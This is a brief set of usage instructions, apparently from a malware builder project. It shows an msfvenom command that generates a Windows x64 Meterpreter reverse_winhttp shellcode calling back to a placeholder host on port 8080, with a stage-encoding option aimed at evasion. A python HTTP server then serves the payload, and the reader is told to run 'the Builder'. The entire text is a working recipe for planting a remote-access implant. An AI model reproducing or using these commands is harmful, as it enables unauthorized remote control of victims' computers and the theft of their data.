# This is a simple shellcode, to use it, just give the following commands:
msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=<host> LPORT=8080 EnableStageEnconding=True -f raw > /home/parrot/x64shellcode.raw
python3 -mhttp.server 8080
# After this, Execute the Builder!
